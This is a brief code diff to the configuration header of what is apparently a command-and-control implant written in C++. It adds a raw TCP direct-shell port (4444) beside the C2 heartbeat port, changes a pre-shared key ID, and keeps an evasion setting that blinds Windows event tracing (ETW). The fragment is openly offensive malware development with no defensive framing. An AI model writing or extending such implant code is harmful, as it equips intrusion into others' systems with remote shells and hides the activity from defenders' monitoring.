@@ -11,10 +11,12 @@
 
 namespace Config {
     /* C2 ENDPOINT SETTINGS */
-    static const char* C2_DOMAIN = "127.0.0.1";
-    static const int   C2_PORT   = 6969;
-    static const char* PSK_SEED = "SuperSecretSeedForClient001";
-    static const char* PSK_ID     = "LdRrpJFuq4uq1smR";
+    static const char* C2_DOMAIN  = "127.0.0.1";
+    static const int   C2_PORT    = 6969;   // Heartbeat / Tasking 
+    static const int   SHELL_PORT = 4444;   // Raw TCP Direct Shell
+    
+    static const char* PSK_SEED   = "SuperSecretSeedForClient001";
+    static const char* PSK_ID     = "YiZZCxy3SLMsIdhN";
 
     /* EVASION SETTINGS */
     static const bool ENABLE_ETW_BLIND = true;
